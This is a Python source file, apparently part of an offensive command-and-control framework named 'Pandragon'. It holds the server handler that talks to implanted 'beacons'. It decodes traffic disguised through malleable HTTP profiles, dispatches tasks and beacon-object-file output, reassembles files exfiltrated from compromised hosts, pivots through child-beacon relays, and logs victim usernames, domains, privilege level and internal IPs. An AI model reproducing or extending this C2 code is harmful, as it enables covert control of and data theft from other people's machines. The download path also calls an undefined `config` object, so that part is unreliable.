"""
Beacon Transport Handler

Implements ITransportHandler to process beacon packets from any transport.
Identification and route validation are centralized here, with divergent
paths for HTTP-like and non-HTTP transports:

  HTTP-like (HTTP/HTTPS):
    1. Base64 decode -> parse header -> look up beacon -> validate route
    2. find_candidates(path, UA, method) -> unwrap wrapper -> decrypt
    3. Validate malleable headers against configured patterns

  Non-HTTP (TCP/PIPE):
    1. Parse header on raw bytes -> look up beacon -> no route validation
    2. find_tcp_candidates(port) -> macro-aware unwrap -> decrypt
    3. Brute-force key scan as last resort
"""

import struct
import base64
import time
import os
import hashlib
import asyncio
import logging
import re
from typing import Optional, Tuple

from aiohttp import web

from .base import ITransportHandler, TransportMessage, TransportResponse, TransportContext, TransportProtocol
from core.config import get_download_dir
from protocol.constants import B2SOpcode, S2BOpcode, get_b2s_opcode_name
from protocol import parse_packet, serialize_response, parse_header, PANDRAGON_MAGIC, unwrap_payload, _macro_to_regex


logger = logging.getLogger('pandragon.transport_handler')


class BeaconTransportHandler(ITransportHandler):
    """Handles beacon packets from any transport (TCP, HTTP, etc.)."""

    def __init__(self, ctx):
        self.ctx = ctx

    async def on_message(self, message: TransportMessage) -> Optional[TransportResponse]:
        """Process an incoming beacon packet from any transport."""
        context = message.context
        client_ip = context.remote_addr
        registry = self.ctx.beacon_registry
        components = self.ctx

        is_http = context.protocol in (TransportProtocol.HTTP, TransportProtocol.HTTPS)

        if is_http:
            result = await self._identify_http(message, registry)
        else:
            result = await self._identify_non_http(message, registry)

        # Identification returned an error response
        if isinstance(result, TransportResponse):
            if result.status_code >= 400 and components.audit_logger:
                components.audit_logger.log_replay_detected(
                    "unknown", client_ip,
                    f"identification_failed"
                )
            return result

        beacon, beacon_id_bytes, packet_data = result

        # ── Phase 4: Decrypt and validate ───────────────────────────────────
        bearer_key = beacon.crypto_key
        parsed = None

        try:
            parsed, err = parse_packet(packet_data, bearer_key, direction_s2b=False)
            if parsed is None:
                decrypt_err = err
        except Exception as e:
            decrypt_err = str(e)

        if parsed is None and beacon.key_rotation_pending and beacon.new_crypto_key:
            logger.debug(f"[{beacon.beacon_id}] Retrying decrypt with new key")
            try:
                parsed, err = parse_packet(packet_data, beacon.new_crypto_key, direction_s2b=False)
                if parsed is not None:
                    beacon.crypto_key = beacon.new_crypto_key
                    beacon.key_rotation_pending = False
                    beacon.new_crypto_key = None
                    beacon.next_task_seq = 0
                    beacon.last_seq_num = -1
                    logger.info(f"[{beacon.beacon_id}] Key rotation detected; switched")
            except Exception:
                pass

        if parsed is None:
            logger.error(f"[{beacon.beacon_id}] Decryption failed")
            return TransportResponse(data=b'', context=context, status_code=400)

        if not await beacon.validate_seq_num(parsed.seq_num):
            if components.audit_logger:
                components.audit_logger.log_replay_detected(beacon.beacon_id, client_ip, "sequence_number")
            return TransportResponse(data=b'', context=context, status_code=400)

        if not await beacon.validate_nonce(parsed.nonce):
            if components.audit_logger:
                components.audit_logger.log_replay_detected(beacon.beacon_id, client_ip, "nonce")
            return TransportResponse(data=b'', context=context, status_code=400)

        await beacon.touch()
        await self._handle_beacon_opcode(beacon, parsed)

        # ── Phase 5: Build response ─────────────────────────────────────────
        task = await beacon.pop_task()
        if not task:
            response_packet = serialize_response(
                opcode=S2BOpcode.NO_TASKS,
                beacon_id=beacon_id_bytes,
                seq_num=beacon.next_task_seq,
                payload=b"",
                key=beacon.crypto_key,
            )
            beacon.next_task_seq += 1
        else:
            response_packet = serialize_response(
                opcode=task["opcode"],
                beacon_id=beacon_id_bytes,
                seq_num=task["seq_num"],
                payload=task.get("payload", b""),
                key=beacon.crypto_key,
            )
            logger.info(f"Dispatching to {beacon.beacon_id}: opcode=0x{task['opcode']:02x}")

        b64_packet = base64.urlsafe_b64encode(response_packet).rstrip(b'=')
        return TransportResponse(data=b64_packet, context=context, status_code=200)

    # ── HTTP identification ─────────────────────────────────────────────

    async def _identify_http(self, message: TransportMessage, registry) -> Tuple:
        """
        Identify a beacon from an HTTP transport request.

        Returns (beacon, beacon_id_bytes, packet_data) on success,
        or TransportResponse on failure (403 for route violations, 400
        for unidentified).
        """
        data = message.data
        context = message.context

        request_path = context.metadata.get('path', '')
        request_ua = context.metadata.get('user_agent', '')
        request_method = context.metadata.get('method', 'GET')
        request_headers = context.metadata.get('headers', {})

        raw_query = data if isinstance(data, bytes) else data.encode('latin-1')

        beacon = None
        beacon_id_bytes = None
        packet_data = None

        # ── Phase 1: Direct decode ──────────────────────────────────────────
        try:
            if isinstance(raw_query, bytes):
                decoded = base64.urlsafe_b64decode(raw_query + b'=' * (-len(raw_query) % 4))
            else:
                decoded = base64.urlsafe_b64decode(raw_query + '=' * (-len(raw_query) % 4))
            header, err = parse_header(decoded)
            if header and header['magic'] == PANDRAGON_MAGIC:
                test_id = header['beacon_id']
                test_session = await registry.get_by_beacon_id(test_id)
                if test_session:
                    if not self._validate_request_route(
                        test_session, request_path, request_ua, request_method, request_headers
                    ):
                        logger.warning(
                            f"[{test_session.beacon_id}] Route validation failed "
                            f"(path={request_path}, UA={request_ua[:50]})"
                        )
                        return TransportResponse(data=b'', context=context, status_code=403)

                    beacon = test_session
                    beacon_id_bytes = test_id
                    packet_data = decoded
                    logger.debug(f"Direct decode: beacon {beacon_id_bytes.hex()}")
        except Exception as e:
            logger.debug(f"Phase 1 direct decode failed: {e}")

        # ── Phase 2: Malleable C2 unwrapping ────────────────────────────────
        if not beacon:
            payload_loc = context.metadata.get('payload_location', '')
            candidates = registry.find_candidates(
                request_path, request_ua, request_method, payload_loc
            )

            logger.debug(f"Phase 2: {len(candidates)} candidate(s) for path={request_path} UA={request_ua[:40]}")
            for candidate_id, route_info in candidates:
                mc = route_info.get('malleable_config')
                if not mc:
                    logger.debug(f"  [{candidate_id}] No malleable_config, skip")
                    continue
                wrapper = mc.get('wrapper', {})
                prefix = wrapper.get('prefix', '')
                suffix = wrapper.get('suffix', '')
                if not prefix and not suffix:
                    logger.debug(f"  [{candidate_id}] No wrapper prefix/suffix, skip")
                    continue

                try:
                    raw_str = raw_query.decode('latin-1') if isinstance(raw_query, bytes) else raw_query
                    unwrapped = unwrap_payload(raw_str, prefix, suffix)
                    if unwrapped == raw_str:
                        logger.debug(f"  [{candidate_id}] unwrap_payload returned unchanged, skip")
                        continue

                    unwrapped_bytes = unwrapped.encode('latin-1')
                    decoded = base64.urlsafe_b64decode(unwrapped_bytes + b'=' * (-len(unwrapped_bytes) % 4))
                    crypto_key = route_info['crypto_key']
                    parsed, err = parse_packet(decoded, crypto_key, direction_s2b=False)
                    if parsed is None:
                        logger.debug(f"  [{candidate_id}] parse_packet failed: {err}")
                        continue
                    if parsed.beacon_id.hex() != candidate_id:
                        logger.debug(f"  [{candidate_id}] beacon_id mismatch: got {parsed.beacon_id.hex()}")
                        continue

                    if not self._validate_malleable_headers(request_headers, mc):
                        logger.debug(f"  [{candidate_id}] Malleable header validation failed")
                        continue

                    candidate_beacon = await registry.register(crypto_key)
                    if candidate_beacon is None:
                        logger.debug(f"  [{candidate_id}] registry.register returned None (unknown beacon)")
                        continue

                    beacon = candidate_beacon
                    beacon_id_bytes = parsed.beacon_id
                    packet_data = decoded
                    beacon.malleable_config = mc
                    logger.info(f"Beacon identified via malleable C2: {candidate_id}")
                    break
                except Exception as e:
                    logger.debug(f"  [{candidate_id}] Exception: {e}")
                    continue

        if not beacon or not packet_data:
            logger.warning(
                f"HTTP beacon rejected: could not identify "
                f"(path={request_path}, method={request_method})"
            )
            return TransportResponse(data=b'', context=context, status_code=400)

        return (beacon, beacon_id_bytes, packet_data)

    # ── Non-HTTP identification ──────────────────────────────────────────

    async def _identify_non_http(self, message: TransportMessage, registry) -> Tuple:
        """
        Identify a beacon from a non-HTTP transport (TCP, PIPE, etc.).

        Non-HTTP transports have no paths, User-Agents, or HTTP methods.
        Identification uses:
          1. Raw header parse on the packet bytes (packets are not base64-encoded)
          2. Port-based candidate lookup -> macro-aware wrapper unwrap -> decrypt
          3. Brute-force key scan as last resort

        Returns (beacon, beacon_id_bytes, packet_data) on success,
        or TransportResponse on failure.
        """
        data = message.data
        context = message.context

        # Raw bytes, we assume no base64 encoding for non-HTTP transports
        raw_bytes = data
        conn_port = context.metadata.get('local_port', 0)
        remote_ip = context.remote_addr.split(':')[0] if context.remote_addr else ''

        beacon = None
        beacon_id_bytes = None
        packet_data = None

        # ── Step 1: Direct header parse on raw bytes ────────────────────────
        try:
            header, err = parse_header(raw_bytes)
            if header and header['magic'] == PANDRAGON_MAGIC:
                test_id = header['beacon_id']
                test_session = await registry.get_by_beacon_id(test_id)
                if test_session:
                    beacon = test_session
                    beacon_id_bytes = test_id
                    packet_data = raw_bytes
                    logger.debug(f"Non-HTTP direct parse: beacon {beacon_id_bytes.hex()}")
        except Exception:
            pass

        # ── Step 2: Port-based TCP candidate lookup + wrapper unwrap ────────
        if not beacon:
            tcp_candidates = registry.find_tcp_candidates(conn_port, remote_ip)

            for candidate_id, route_info in tcp_candidates:
                mc = route_info.get('malleable_config')
                wrapper = (mc or {}).get('wrapper', {})
                prefix = (wrapper or {}).get('prefix', '')
                suffix = (wrapper or {}).get('suffix', '')

                try:
                    # Decode bytes to string for macro-aware unwrapping
                    raw_str = raw_bytes.decode('latin-1')
                    unwrapped_str = raw_str

                    # Try literal unwrap first (fast path)
                    if prefix or suffix:
                        lit_unwrapped = unwrap_payload(raw_str, prefix, suffix)
                        if lit_unwrapped != raw_str:
                            unwrapped_str = lit_unwrapped
                        else:
                            # Try macro-based regex unwrap
                            # Strip prefix
                            if prefix:
                                prefix_re = _macro_to_regex(prefix)
                                m = re.match(prefix_re, unwrapped_str)
                                if m:
                                    unwrapped_str = unwrapped_str[m.end():]
                            # Strip suffix
                            if suffix:
                                suffix_re = _macro_to_regex(suffix)
                                m = re.search(suffix_re + '$', unwrapped_str)
                                if m:
                                    unwrapped_str = unwrapped_str[:m.start()]

                    unwrapped_bytes = unwrapped_str.encode('latin-1')
                    crypto_key = route_info['crypto_key']

                    # Non-HTTP payloads are raw encrypted bytes, not base64
                    parsed, err = parse_packet(unwrapped_bytes, crypto_key, direction_s2b=False)
                    if parsed is None:
                        continue
                    if parsed.beacon_id.hex() != candidate_id:
                        continue

                    candidate_beacon = await registry.register(crypto_key)
                    if candidate_beacon is None:
                        continue

                    beacon = candidate_beacon
                    beacon_id_bytes = parsed.beacon_id
                    packet_data = unwrapped_bytes
                    if mc:
                        beacon.malleable_config = mc
                    logger.info(f"Non-HTTP beacon via TCP port match: {candidate_id}")
                    break
                except Exception:
                    continue

        # ── Step 3: Brute-force key scan (last resort) ───────────────────────
        if not beacon:
            for beacon_id, info in list(registry._known_beacons.items()):
                try:
                    crypto_key = info['crypto_key']
                    parsed, err = parse_packet(raw_bytes, crypto_key, direction_s2b=False)
                    if parsed is not None and parsed.beacon_id.hex() == beacon_id:
                        candidate_beacon = await registry.register(crypto_key)
                        if candidate_beacon:
                            beacon = candidate_beacon
                            beacon_id_bytes = parsed.beacon_id
                            packet_data = raw_bytes
                            logger.warning(
                                f"Non-HTTP beacon identified via brute-force key scan: {beacon_id}"
                            )
                            break
                except Exception:
                    continue

        if not beacon or not packet_data:
            logger.warning(
                f"Non-HTTP beacon rejected: could not identify "
                f"(port={conn_port}, remote={remote_ip})"
            )
            return TransportResponse(data=b'', context=context, status_code=400)

        return (beacon, beacon_id_bytes, packet_data)

    # ── Route and malleable validators ───────────────────────────────────

    def _validate_request_route(
        self, beacon, path: str, ua: str, method: str, headers: dict
    ) -> bool:
        """
        Validate that the beacon is allowed on this specific HTTP route.

        Checks path, User-Agent, HTTP method, and malleable headers
        against the beacon's allowed_routes. Only called for HTTP transports.
        """
        for route in beacon.allowed_routes:
            route_path = route.get('path', '')
            if not (path == route_path or path.startswith(route_path + '?') or path.startswith(route_path + '%3F')):
                continue

            route_ua = route.get('user_agent', '')
            ua_match = (route_ua in ua) if route_ua else True
            if not ua_match:
                continue

            route_method = route.get('http_method', 'GET')
            if route_method != method:
                continue

            # Check malleable headers if present
            mc = route.get('malleable_config')
            if mc and not self._validate_malleable_headers(headers, mc):
                continue

            return True

        logger.debug(
            f"[{beacon.beacon_id}] No matching route: path={path}, "
            f"method={method}, UA={ua[:50]}"
        )
        return False

    def _validate_malleable_headers(self, actual_headers: dict, malleable_config: dict) -> bool:
        """
        Validate that actual HTTP headers match the malleable config patterns.

        For each header in malleable_config.http_headers, compile the value
        pattern (with macros expanded to regex) and match it against the
        actual header value.
        """
        headers_spec = malleable_config.get('http_headers', [])
        if not headers_spec:
            return True

        for spec in headers_spec:
            name = spec.get('name', '')
            value_pattern = spec.get('value', '')
            if not name or not value_pattern:
                continue

            actual_value = actual_headers.get(name)
            if actual_value is None:
                logger.debug(f"Missing malleable header: {name}")
                return False

            try:
                regex_str = _macro_to_regex(value_pattern)
                if not re.match(regex_str, actual_value):
                    logger.debug(f"Malleable header mismatch: {name} (pattern={value_pattern!r})")
                    return False
            except Exception as e:
                logger.debug(f"Malleable header regex failed: {name}: {e}")
                return False

        return True

    async def on_connect(self, context: TransportContext) -> None:
        logger.debug(f"Beacon connect: {context.remote_addr} ({context.protocol.name})")

    async def on_disconnect(self, context: TransportContext) -> None:
        logger.debug(f"Beacon disconnect: {context.remote_addr} ({context.protocol.name})")

    async def send_response(self, response: TransportResponse) -> bool:
        return True

    # ── Opcode dispatch table ─────────────────────────────────────

    _OPCODE_HANDLERS = {}

    def __init_subclass__(cls, **kwargs):
        pass

    def _build_opcode_dispatch(self) -> dict:
        """Build opcode-to-handler dispatch table."""
        return {
            B2SOpcode.BEACON_POLL: self._op_poll,
            B2SOpcode.BEACON_CHECK_IN: self._op_check_in,
            B2SOpcode.BOF_OUTPUT: self._op_bof_output,
            B2SOpcode.BEACON_TASK_RESULT: self._op_task_result,
            B2SOpcode.BEACON_ERROR: self._op_error,
            B2SOpcode.KEY_ROTATE_ACK: self._op_key_rotate_ack,
            B2SOpcode.FILE_WRITE_RESULT: self._op_file_write_result,
            B2SOpcode.FILE_DOWNLOAD_ACK: self._op_file_download_ack,
            B2SOpcode.FILE_CHUNK_DATA: self._op_file_chunk_data,
            B2SOpcode.FILE_UPLOAD_ACK: self._op_file_upload_ack,
            B2SOpcode.LIST_FILES_RESULT: self._op_list_files_result,
            B2SOpcode.RELAY_CHILD_UP: self._op_relay_child_up,
        }

    async def _handle_beacon_opcode(self, beacon, parsed):
        """Handle parsed beacon opcode via dispatch table."""
        opcode = parsed.opcode
        payload = parsed.payload

        dispatch = self._build_opcode_dispatch()
        handler = dispatch.get(opcode)
        if handler:
            await handler(beacon, payload)
        else:
            logger.warning(f"[{beacon.beacon_id}] Unknown opcode: 0x{opcode:02x}")

    # ── Opcode handlers ───────────────────────────────────────────

    async def _op_poll(self, beacon, payload):
        logger.debug(f"[{beacon.beacon_id}] Poll request (opcode=0x02)")
        if len(payload) >= 1:
            num_cached = payload[0]
            if num_cached > 0 and len(payload) >= 1 + num_cached * 4:
                bof_ids = []
                for i in range(num_cached):
                    bof_id = struct.unpack('<I', payload[1 + i*4:1 + i*4 + 4])[0]
                    bof_ids.append(bof_id)
                self.ctx.beacon_cache_state.update(beacon.beacon_id, bof_ids)
                logger.debug(f"[{beacon.beacon_id}] Cached BOF IDs: {bof_ids}")

    async def _op_check_in(self, beacon, payload):
        if len(payload) >= 24:
            self._parse_checkin_system_info(beacon, payload)
        await self._log_generic_output(beacon, B2SOpcode.BEACON_CHECK_IN, payload)

    async def _op_bof_output(self, beacon, payload):
        if len(payload) < 4:
            logger.warning(f"[{beacon.beacon_id}] BOF_OUTPUT too small ({len(payload)} bytes)")
            return
        bof_id = struct.unpack('<I', payload[:4])[0]
        bof_data = payload[4:]
        logger.info(f"[{beacon.beacon_id}] BOF_OUTPUT bof_id={bof_id} ({len(bof_data)} bytes)")
        await beacon.update_long_running_bof(bof_id)
        task_id = beacon.current_task_id if hasattr(beacon, 'current_task_id') else None
        task = self.ctx.task_queue.get_task(task_id) if self.ctx.task_queue and task_id else None
        if task:
            await beacon.log_output(bof_data)
            await self.ctx.broadcast('beacon_output', {
                'task_id': task_id, 'data': bof_data.decode('latin-1', errors='replace')
            })
        else:
            await beacon.log_output(bof_data)
            await self.ctx.broadcast('beacon_output', {
                'data': bof_data.decode('latin-1', errors='replace')
            })

    async def _op_task_result(self, beacon, payload):
        await self._log_generic_output(beacon, B2SOpcode.BEACON_TASK_RESULT, payload)
        if beacon.current_task_id:
            task_id = beacon.current_task_id
            beacon.current_task_id = None
            if self.ctx.task_queue:
                await self.ctx.task_queue.complete_task(task_id, result=payload)
                logger.info(f"Task {task_id} marked as COMPLETED")

    async def _op_error(self, beacon, payload):
        await self._log_generic_output(beacon, B2SOpcode.BEACON_ERROR, payload)

    async def _op_key_rotate_ack(self, beacon, payload):
        if len(payload) < 1:
            return
        status = payload[0]
        if status == 0:
            if beacon.key_rotation_pending and beacon.new_crypto_key:
                beacon.crypto_key = beacon.new_crypto_key
                beacon.key_rotation_pending = False
                beacon.new_crypto_key = None
                beacon.last_seq_num = -1
                beacon.next_task_seq = 0
                logger.info(f"[{beacon.beacon_id}] Key rotation completed")
                if self.ctx.audit_logger:
                    self.ctx.audit_logger.log_key_rotation(beacon.beacon_id, "beacon_ack")
        else:
            logger.error(f"[{beacon.beacon_id}] Key rotation rejected")
            beacon.key_rotation_pending = False
            beacon.new_crypto_key = None

    async def _op_file_write_result(self, beacon, payload):
        logger.info(f"[{beacon.beacon_id}] File write result: {'success' if payload else 'failed'}")

    async def _op_file_download_ack(self, beacon, payload):
        await self._handle_file_download_ack(beacon, payload)

    async def _op_file_chunk_data(self, beacon, payload):
        await self._handle_file_chunk_data(beacon, payload)

    async def _op_file_upload_ack(self, beacon, payload):
        await self._handle_file_upload_ack(beacon, payload)

    async def _op_list_files_result(self, beacon, payload):
        await self._log_generic_output(beacon, B2SOpcode.LIST_FILES_RESULT, payload)

    async def _op_relay_child_up(self, beacon, payload):
        """Handle RELAY_CHILD_UP from a parent beacon."""
        logger.info(f"[{beacon.beacon_id}] RELAY_CHILD_UP ({len(payload)} bytes)")
        await self._handle_relay_child_up(beacon, payload)

    async def _log_generic_output(self, beacon, opcode, payload):
        """Log and broadcast beacon output for CHECK_IN, TASK_RESULT, ERROR."""
        from utils.binary_output import detect_and_save_binary_output

        binary_info = None
        if opcode != B2SOpcode.BEACON_CHECK_IN:
            binary_info = detect_and_save_binary_output(beacon.beacon_id, payload)

        await beacon.log_output(payload, binary_file=binary_info)
        logger.debug(f"[{beacon.beacon_id}] {get_b2s_opcode_name(opcode)}: {payload[:200]!r}")

        cleaned = self._strip_pkcs7_padding(payload)
        broadcast_data = {
            'beacon_id': beacon.beacon_id,
            'data': cleaned.decode('utf-8', errors='replace'),
            'type': get_b2s_opcode_name(opcode).lower(),
        }
        if binary_info:
            broadcast_data['binary_file'] = binary_info
        await self.ctx.broadcast('beacon_output', broadcast_data)

    async def _handle_relay_child_up(self, beacon, payload):
        """Process a RELAY_CHILD_UP: decrypt and handle child's packet."""
        from relay.relay_handler import handle_relay_up

        if len(payload) < 4:
            logger.warning(f"[{beacon.beacon_id}] RELAY_CHILD_UP payload too short")
            return

        pipe_id = struct.unpack('<I', payload[:4])[0]
        encrypted_child_packet = payload[4:]

        result = await handle_relay_up(
            parent_beacon_id=bytes.fromhex(beacon.beacon_id),
            pipe_id=pipe_id,
            encrypted_packet=encrypted_child_packet,
            registry=self.ctx.beacon_registry,
            transport_handler=self,
        )

        if result:
            logger.debug(f"[{beacon.beacon_id}] RELAY_CHILD_UP processed: child response ready")
            # Queue RELAY_DOWN response to be sent on next parent check-in
            relay_response = struct.pack('<I', pipe_id) + result
            await beacon.queue_task(S2BOpcode.RELAY_DOWN, relay_response)

    def _parse_checkin_system_info(self, beacon, payload: bytes):
        off = 0
        try:
            if len(payload) < 24:
                return

            beacon.os_major, beacon.os_minor, beacon.os_build = struct.unpack_from('<III', payload, off)
            off += 12

            beacon.arch, = struct.unpack_from('<H', payload, off)
            off += 2

            beacon.is_wow64 = bool(payload[off]); off += 1
            beacon.is_elevated = bool(payload[off]); off += 1
            beacon.is_domain_joined = bool(payload[off]); off += 1

            beacon.pid, = struct.unpack_from('<I', payload, off)
            off += 4

            def read_str(data, offset):
                if offset + 2 > len(data):
                    return '', offset
                slen, = struct.unpack_from('<H', data, offset)
                offset += 2
                if offset + slen > len(data):
                    return '', offset
                s = data[offset:offset+slen].decode('utf-8', errors='replace')
                return s, offset + slen

            beacon.process_name, off = read_str(payload, off)
            beacon.username, off = read_str(payload, off)
            beacon.computer_name, off = read_str(payload, off)
            beacon.domain, off = read_str(payload, off)

            if off + 6 <= len(payload):
                beacon.ram_mb, beacon.cpu_cores = struct.unpack_from('<IB', payload, off)
                off += 5
                beacon.ip_count = payload[off]; off += 1

                beacon.internal_ips = []
                for _ in range(beacon.ip_count):
                    if off + 1 > len(payload):
                        break
                    ip_len = payload[off]; off += 1
                    if off + ip_len > len(payload):
                        break
                    beacon.internal_ips.append(payload[off:off+ip_len].decode('utf-8', errors='replace'))
                    off += ip_len

            logger.info(
                f"[{beacon.beacon_id}] System info: {beacon.username}@{beacon.computer_name} "
                f"({beacon.domain or 'WORKGROUP'}) | "
                f"Win {beacon.os_major}.{beacon.os_minor}.{beacon.os_build} | "
                f"PID={beacon.pid} ({beacon.process_name}) | "
                f"{'Elevated' if beacon.is_elevated else 'Standard'} | "
                f"{'Domain-joined' if beacon.is_domain_joined else 'Workgroup'} | "
                f"{beacon.ram_mb or 0}MB RAM, {beacon.cpu_cores or 0} cores | "
                f"IPs: {', '.join(beacon.internal_ips) if beacon.internal_ips else 'N/A'}"
            )
        except Exception as e:
            logger.warning(f"[{beacon.beacon_id}] Failed to parse check-in system info: {e}")

    async def _handle_file_download_ack(self, beacon, payload: bytes):
        file_transfer_mgr = self.ctx.file_transfer_manager

        if len(payload) < 12:
            logger.error(f"[{beacon.beacon_id}] FILE_DOWNLOAD_ACK: payload too short ({len(payload)} bytes)")
            return

        file_size = struct.unpack('<I', payload[:4])[0]
        transfer_id = payload[4:12].decode('ascii', errors='replace')

        logger.info(f"[{beacon.beacon_id}] FILE_DOWNLOAD_ACK: transfer_id={transfer_id}, file_size={file_size} bytes")

        if file_transfer_mgr:
            file_transfer_mgr.set_download_file_size(transfer_id, file_size)

    async def _handle_file_chunk_data(self, beacon, payload: bytes):
        file_transfer_mgr = self.ctx.file_transfer_manager

        if len(payload) < 17:
            logger.error(f"[{beacon.beacon_id}] FILE_CHUNK_DATA: payload too short ({len(payload)} bytes)")
            return

        transfer_id = payload[:8].decode('ascii', errors='replace')
        chunk_index, offset = struct.unpack('<II', payload[8:16])
        status = payload[16]
        chunk_data = payload[17:]

        if not file_transfer_mgr:
            logger.error(f"[{beacon.beacon_id}] FILE_CHUNK_DATA: file_transfer_mgr not available")
            return

        chunk_status_str = file_transfer_mgr.add_chunk_with_status(transfer_id, chunk_index, offset, chunk_data, status)

        await self.ctx.broadcast('file_transfer_status', {
            'beacon_id': beacon.beacon_id,
            'transfer_id': transfer_id,
            'direction': 'download',
            'chunk_index': chunk_index,
            'offset': offset,
            'status': chunk_status_str or 'unknown',
        })

        if chunk_status_str == 'complete':
            output_dir = config.get_download_dir()
            output_path = await asyncio.to_thread(file_transfer_mgr.assemble_download_file, transfer_id, output_dir)
            if output_path:
                logger.info(f"[{beacon.beacon_id}] Download assembled: {output_path} (transfer_id={transfer_id})")
                final_size = 0
                try:
                    final_size = os.path.getsize(output_path)
                except OSError:
                    final_size = 0
                await self.ctx.broadcast('file_transfer_complete', {
                    'beacon_id': beacon.beacon_id,
                    'transfer_id': transfer_id,
                    'file_path': output_path,
                    'file_size': final_size,
                    'direction': 'download',
                })
            else:
                logger.error(f"[{beacon.beacon_id}] Failed to assemble download (transfer_id={transfer_id})")
                await self.ctx.broadcast('file_transfer_status', {
                    'beacon_id': beacon.beacon_id,
                    'transfer_id': transfer_id,
                    'status': 'assemble_failed',
                })

    async def _handle_file_upload_ack(self, beacon, payload: bytes):
        file_transfer_mgr = self.ctx.file_transfer_manager

        if len(payload) < 13:
            logger.error(f"[{beacon.beacon_id}] FILE_UPLOAD_ACK: payload too short ({len(payload)} bytes)")
            return

        transfer_id = payload[:8].decode('ascii', errors='replace')
        chunk_index, status = struct.unpack('<IB', payload[8:13])

        if not file_transfer_mgr:
            logger.error(f"[{beacon.beacon_id}] FILE_UPLOAD_ACK: file_transfer_mgr not available")
            return

        if status == 0:
            next_index = chunk_index + 1
            result = file_transfer_mgr.get_upload_chunk(transfer_id, next_index)
            tid, offset, chunk_data, is_last = result
            if tid is not None and chunk_data:
                chunk_payload = struct.pack('<IB', offset, 1 if is_last else 0) + chunk_data
                await beacon.queue_task(S2BOpcode.FILE_UPLOAD_CHUNK, chunk_payload)
                if is_last:
                    transfer_session = file_transfer_mgr.transfers.get(transfer_id)
                    if transfer_session:
                        transfer_session.status = 'complete'
                    logger.info(f"[{beacon.beacon_id}] Upload complete: transfer_id={transfer_id}, {offset + len(chunk_data)} bytes sent")

    @staticmethod
    def _strip_pkcs7_padding(data: bytes) -> bytes:
        if not data or len(data) < 2:
            return data
        padding_len = data[-1]
        if 1 <= padding_len <= 16 and padding_len <= len(data):
            if all(b == padding_len for b in data[-padding_len:]):
                return data[:-padding_len]
        return data
